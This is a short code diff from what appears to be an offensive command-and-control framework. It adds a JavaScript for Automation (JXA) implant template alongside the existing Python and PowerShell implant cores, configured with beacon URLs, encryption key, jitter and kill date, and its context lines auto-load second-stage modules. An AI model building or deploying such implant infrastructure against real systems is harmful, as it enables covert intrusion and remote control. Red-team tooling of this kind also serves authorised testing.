@@ -50,6 +50,8 @@ IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDa
         self.PythonCore = py_implant_core % (self.DomainFrontHeader, self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Jitter, self.Key, self.RandomURI, self.UserAgent)
         ps_implant_core = open("%s/Implant-Core.ps1" % PayloadTemplatesDirectory, 'r').read()
         self.PSCore = ps_implant_core % (self.Key, self.Jitter, self.Sleep, self.AllBeaconImages, self.RandomURI, self.RandomURI, self.KillDate, self.AllBeaconURLs)  # Add all db elements def display(self):
+        jxa_implant_core = open("%s/Implant-Core.js" % PayloadTemplatesDirectory, 'r').read()
+        self.JXACore = jxa_implant_core % (self.Key, self.Jitter, self.Sleep, self.AllBeaconImages, self.RandomURI, self.ServerURL, self.KillDate, self.AllBeaconURLs)
     # Add all db elements
 
     def display(self):
@@ -122,7 +124,7 @@ IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDa
             new_task("loadmodule Stage2-Core.exe", "autoruns", self.RandomURI)
             new_task("loadmodule PwrStatusTracker.dll", "autoruns", self.RandomURI)
             new_task("loadpowerstatus", "autoruns", self.RandomURI)
-            update_mods("Stage2-Core.exe PwrStatusTracker.dll", self.RandomURI)         
+            update_mods("Stage2-Core.exe PwrStatusTracker.dll", self.RandomURI)
             update_label("PSM", self.RandomURI)
         if "PS" in self.Pivot:
             new_task("loadmodule Stage2-Core.ps1", "autoruns", self.RandomURI)
